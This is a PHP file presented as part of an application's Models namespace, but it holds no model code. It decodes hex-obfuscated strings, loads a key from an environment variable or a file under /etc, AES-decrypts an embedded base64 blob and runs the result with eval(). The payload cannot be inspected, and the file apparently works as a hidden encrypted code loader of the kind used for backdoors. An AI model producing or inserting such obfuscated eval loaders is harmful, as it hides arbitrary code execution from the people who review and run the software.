<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XqsG6VwgU/LQ3yN/Q+MJeg==');

$c=base64_decode(

'IPpKUPocgxj0qhJsHrcI9p2MTxPPRd2quIvY9JfmS4R096k8RoXrNCohyBDgVZuC1DMAfncrHC4G' .
'mu8ycoCZKjNDz/FgXWU1JE7U6+aVpYzka57bHclOqsXnIuuCIa/N74eLcgp41RzJntQS12heY20G' .
'8VA8N/kgM0nXrnUsuzPu4scnbxbTPwx6k+i3Owc9NpMxph3x2eXFb5wEAUAYuXcQGuwvhhK17JYP' .
'iG1b/I3Q9OQ7n0RmrfWCo7USnQqCIQsdSTTGSMoPCQrcIJzL4TPo5/QGDJbOdrEddC0xypM4ygof' .
'VyiSZ1zTiwXcLv/VOV6U1a0b6Ts6lVqrBp+DZEHRQ2Xiaki+rJRSoEAO/ecg6ZZC6jm2v6R5yMbS' .
'jvzijoPVMZoSokrb7tAyjU7Q/aaO2BXstf7YI7OuZaJ2UNnYP0sydCm+Sj6E2pfEx8ayVn43mPif' .
'U7mXZgepHzHTjcDe5h68Z+JoEXXFSQhagBaYAA43w1QzlVgrLjl9zX/afLS1vCWii8Hfd1ytnGvK' .
'rnZByL7sIEJoMvMVBlXa5asUFacRgX1Tm8Dpa1tJO42Nvb1d/QCN4OuDuOo1bBRfZ5WM5c4Usbyw' .
'ruvEHUFBUgiOhQRXJoutASxMAMznF0pfw53Wisdd5tRs7K6xFYcHjpqyyA05z3Isexo+orIprCvW' .
'RsNq4Un7s6nwI5zA9s/vqCqZcsB5P8dY93XfHhdUjeTKybrxTUcuVC6mZ8i73/8mJWzxi9sImDeN' .
'zQwHqdV4zc8dV92x0ayaXp30sDaZAdgIku30LKF7t3l7OzkajwT+BKG1JSCWdVNg0Um3Mwutawjk' .
'L9RN+1WyujgXMStqT1QnM80xxC95Nd4zPBCT06RIJ5UJ2QSNNiSoC7TeKF3H'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

